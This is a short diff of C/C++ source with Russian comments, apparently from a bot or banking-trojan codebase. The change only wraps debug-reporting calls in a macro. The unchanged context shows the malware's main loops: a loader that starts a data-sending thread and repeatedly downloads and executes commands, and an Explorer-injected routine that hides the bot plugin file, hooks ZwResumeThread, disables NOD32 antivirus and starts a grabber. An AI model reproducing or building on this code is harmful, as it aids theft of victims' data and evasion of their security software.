@@ -90,7 +90,7 @@ DWORD WINAPI LoaderRoutine(LPVOID Data)
 	InitializeTaskManager(NULL, true);
 
 	// Инициализируем систему отправки статистической информации
-	DebugReportInit();
+	PP_DBGRPT_FUNCTION_CALL(DebugReportInit());
 
 	// Вызываем событие
 	bool Cancel = false;
@@ -101,7 +101,7 @@ DWORD WINAPI LoaderRoutine(LPVOID Data)
 	}
 
 	// 402_pl запуск цикла получения команд (он получается в другом процессе)
-	DebugReportStepByName("402_pl");
+	PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("402_pl"));
 
 	// Запускаем поток отправки данных
 	DataGrabber::StartDataSender();
@@ -118,7 +118,7 @@ DWORD WINAPI LoaderRoutine(LPVOID Data)
 	while (true)
 	{
 		// 403_pl цикл получения команд
-		DebugReportStepByName("403_pl");
+		PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("403_pl"));
 		
 		DownloadAndExecuteCommand(NULL, NULL);
 
@@ -152,7 +152,7 @@ DWORD WINAPI ExplorerMain(LPVOID Data)
 	DisableShowFatalErrorDialog();
 	
 	// Инициализируем систему отправки статистической информации
-	DebugReportInit();
+	PP_DBGRPT_FUNCTION_CALL(DebugReportInit());
 	BOT::AddHiddenFile(GetHashFileNameBotPlug());
 
 	HookZwResumeThread();
@@ -165,7 +165,7 @@ DWORD WINAPI ExplorerMain(LPVOID Data)
 	OffNOD32();
 
 	// 401_pl запуск BotPlug
-	DebugReportStepByName("401_pl");
+	PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("401_pl"));
 	
 	#ifdef GrabberH
 		if ( dwFirst && !dwGrabberRun ) 
